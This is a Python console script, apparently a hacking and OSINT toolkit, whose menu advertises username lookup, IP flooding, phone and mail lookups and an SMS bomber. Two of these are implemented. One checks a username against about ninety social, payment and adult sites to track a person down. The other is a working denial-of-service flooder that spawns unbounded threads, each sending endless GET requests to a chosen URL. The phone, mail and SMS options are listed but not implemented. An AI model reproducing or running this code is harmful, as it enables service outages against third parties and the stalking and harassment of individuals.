import threading
import colorama
import requests
from colorama import Fore
import time
import os

RED = Fore.RED
GREEN = Fore.GREEN
BLUE = Fore.BLUE
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET # Back default color in console

MAIN_COLOR = BLUE # If you want to change the color theme
VERSION = "1.0.0"
initialized = False

ASCII_ICON = """
░░░░░░░░░▄▄██████▄▄
░░░░░▄▄██████████████▄▄
░░░▄████▀▀░░░░░░░░▀▀████▄
░░▄███▀░░░░░░░░░░░░░░▀███▄
░▄███░░░░░░░░░░░░░░░░░░███▄
░███░░░░░▄▄▄████▄▄▄░░░░░███
░███░░▄█████░░░░█████▄░░███
░███░░▀█████░░░░█████▀░░███
░███░░░░░▀▀▀████▀▀▀░░░░░███
░▀███░░░░░░░░░░░░░░░░░░███▀
░░▀███▄░░░░░░░░░░░░░░▄███▀
░░░▀████▄▄░░░░░░░░▄▄████░░▄
░░░░░▀▀██████████████▀░░▄███▄
░░░░░░░░░▀▀██████▀▀░░░░▀██████▄
░░░░░░░░░░░░░░░░░░░░░░░░░▀███████▄
░░░░░░░░░░░░░░░░░░░░░░░░░░░▀███████▄
░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀█████████▄
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀████████▄
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀███████
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀▀▀▀▀
"""

FUNCTION_LIST = f"""
{MAIN_COLOR}[1] {RESET}Find username
{MAIN_COLOR}[2] {RESET}Flood IP (DOS. HIGH CPU LOADING!!!)
{MAIN_COLOR}[3] {RESET}Phone Info (API)
{MAIN_COLOR}[4] {RESET}Mail Info (API)
{MAIN_COLOR}[5] {RESET}SMS Bomber (Only RU, UA, KZ)
____________________________________
FINDER VERSION: {RED + VERSION + RESET}
"""

usernameFindDomains = [
     'https://github.com/',
     'https://gitlab.com/',
     'https://bitbucket.org/',
     'https://vk.com/',
     'https://ok.ru/',
     'https://t.me/',
     'https://instagram.com/',
     'https://facebook.com/',
     'https://x.com/',
     'https://twitter.com/',
     'https://youtube.com/@',
     'https://youtube.com/',
     'https://tiktok.com/@',
     'https://threads.net/@',
     'https://linkedin.com/in/',
     'https://reddit.com/user/',
     'https://pinterest.com/',
     'https://snapchat.com/add/',
     'https://discord.com/users/',
     'https://steamcommunity.com/id/',
     'https://twitch.tv/',
     'https://kick.com/',
     'https://trovo.live/',
     'https://soundcloud.com/',
     'https://spotify.com/user/',
     'https://last.fm/user/',
     'https://bandcamp.com/',
     'https://deviantart.com/',
     'https://behance.net/',
     'https://dribbble.com/',
     'https://medium.com/@',
     'https://dev.to/',
     'https://hashnode.com/@',
     'https://habr.com/ru/users/',
     'https://pikabu.ru/@',
     'https://dzen.ru/',
     'https://rutube.ru/u/',
     'https://boosty.to/',
     'https://patreon.com/',
     'https://buymeacoffee.com/',
     'https://ko-fi.com/',
     'https://onlyfans.com/',
     'https://flickr.com/people/',
     'https://500px.com/p/',
     'https://imgur.com/user/',
     'https://about.me/',
     'https://replit.com/@',
     'https://codepen.io/',
     'https://npmjs.com/~',
     'https://archive.org/details/@',
     'https://goodreads.com/',
     'https://letterboxd.com/',
     'https://chess.com/member/',
     'https://lichess.org/@/',
     'https://freelancer.com/u/',
     'https://fiverr.com/',
     'https://kwork.ru/user/',
     'https://etsy.com/shop/',
     'https://ebay.com/usr/',
     'https://paypal.me/',
     'https://cash.app/$',
     'https://qiwi.com/n/',
     'https://pornhub.com/users/',
     'https://xvideos.com/profiles/',
     'https://badoo.com/profile/',
     'https://telegram.me/',
     'https://weibo.com/',
     'https://douyin.com/user/',
     'https://quora.com/profile/',
     'https://tripadvisor.com/members/',
     'https://airbnb.com/users/show/',
     'https://blueskyweb.xyz/profile/',
     'https://mastodon.social/@',
     'https://tryhackme.com/p/',
     'https://hackthebox.com/home/users/profile/',
     'https://forum.guns.ru/forummisc/show_profile/',
     'https://livejournal.com/profile/',
     'https://drive2.ru/users/',
     'https://author.today/u/',
     'https://ficbook.net/authors/',
     'https://wattpad.com/user/',
     'https://tjournal.ru/u/',
     'https://cyberforum.ru/members/',
     'https://forum.cxem.net/index.php?/profile/',
     'https://kernel.org/pub/linux/kernel/people/',
     'https://launchpad.net/~',
     'https://sourceforge.net/u/',
     'https://news.ycombinator.com/user?id=',
     'https://producthunt.com/@',
     'https://www.roblox.com/users/',
     'https://www.minecraftforum.net/members/',
     'https://osu.ppy.sh/users/',
     'https://genshin.hoyolab.com/accountCenter/postList?id='
]

FoundedDomains = []

def FindUsername(username: str):
     cc()
     for domain in usernameFindDomains:
          try:
               r = requests.get(f'{domain+username}', timeout=3)
               if r.status_code == 404:
                    print(f'{domain + username} | {RED}Not found{RESET}')
               elif r.status_code == 200:
                    print(f'{domain + username} | {GREEN}Found{RESET}')
                    FoundedDomains.append(domain+username)
               else:
                    print(f'{domain + username} | {YELLOW}Unknown{RESET}')
          except Exception as e:
               continue
     for found in FoundedDomains:
          print('\n\n\nFounded pages')
          print(f'{GREEN}+{RESET} | {found}\n')

def FloodIP(url: str):
     cc()
     confirmation = int(input('Send 1 to confirm\n-> '))
     if confirmation == 1:
          def ThreadFlood():
               while 1:
                    requests.get(url=url)

          while 1:
               threading.Thread(target=ThreadFlood).start()

def cc():
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

def menu():
     global initialized

     if not initialized:
          cc()
          print(ASCII_ICON)
          time.sleep(1.5)
          initialized = True
          cc()

     print(FUNCTION_LIST)
     
     fnc = int(input(" -> "))

     match fnc:
          case 1:
               username = str(input('Username -> '))
               FindUsername(username=username)
          case 2:
               server = str(input("Send URL or IP\n-> "))
               FloodIP(server)

if __name__ == "__main__":
     menu()